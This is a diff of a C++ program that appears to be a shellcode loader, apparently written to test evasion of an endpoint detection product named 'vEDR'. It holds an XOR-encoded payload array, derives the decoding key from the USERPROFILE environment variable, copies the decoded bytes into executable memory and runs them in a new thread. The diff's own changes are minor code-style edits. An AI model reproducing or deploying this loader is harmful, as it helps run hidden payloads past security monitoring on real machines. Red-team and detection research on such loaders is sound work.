@@ -6,7 +6,7 @@
 int main() {
 
     HMODULE hDll = LoadLibraryA("vEDR_DLL.dll");
-    if (hDll == NULL) {
+    if (hDll == nullptr) {
         return 1;
     }
 
@@ -30,7 +30,13 @@ int main() {
             "\x19\x78\x65\x60\x0a\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24"
             "\x6f\x72\x6f\x0a";
 
-    const std::string USERPROFILE = getenv("USERPROFILE");
+
+    char* USERPROFILE;
+
+     _dupenv_s(&USERPROFILE, nullptr, "USERPROFILE");
+
+    //std::string USERPROFILE = getenv("USERPROFILE");
+
     const std::uint8_t key = static_cast<std::uint8_t>(USERPROFILE[0]) - 57;
 
     for (unsigned char &i: buf) {
@@ -40,7 +46,7 @@ int main() {
     void *exec = VirtualAlloc(nullptr, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, buf, sizeof(buf));
 
-    const HANDLE hThread = CreateThread(nullptr, 0,
+    HANDLE hThread = CreateThread(nullptr, 0,
                                         (LPTHREAD_START_ROUTINE) exec,
                                         nullptr, 0, nullptr);
 
